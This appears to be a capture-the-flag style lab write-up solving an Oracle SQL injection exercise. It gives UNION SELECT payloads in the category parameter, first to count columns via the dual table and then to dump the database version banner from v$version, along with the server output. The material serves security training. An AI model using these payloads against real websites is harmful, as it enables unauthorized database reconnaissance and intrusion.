## SQL injection attack, querying the database type and version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. Using a UNION attack, it is possible to retrieve the database version.

## Notes

- `/filter?category=Pets`
- Oracle database
- `dual` table is required on Oracle

## Resume

1. Capture the `filter` request
2. Find the number of columns
3. Find which column reflects data
4. Dump Oracle version banner

## Solve

First, intercept the request or directly test the payload in the browser using the `category` parameter.

Try with 3 columns :

```
/filter?category='+UNION+SELECT+'abc','def','ghi'+FROM+dual--
```

This returns an error :

```
Internal Server Error
```

Now retry with only 2 columns :

```
/filter?category='+UNION+SELECT+'abc','def'+FROM+dual--
```

This time there is no error and both values are reflected inside the page :

```html
<tbody>
<tr>
    <th>abc</th>
    <td>def</td>
</tr>
</tbody>
```

This confirms that the query contains **2 columns**.

The next step is to determine which column can display data from the database. We can test both columns with the Oracle version banner :

```
'+UNION+SELECT+NULL,BANNER+FROM+v$version--
```

and :

```
'+UNION+SELECT+BANNER,NULL+FROM+v$version--
```

Both payloads successfully display the Oracle database version :

```
CORE 11.2.0.2.0 Production
NLSRTL Version 11.2.0.2.0 - Production
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
PL/SQL Release 11.2.0.2.0 - Production
TNS for Linux: Version 11.2.0.2.0 - Production
```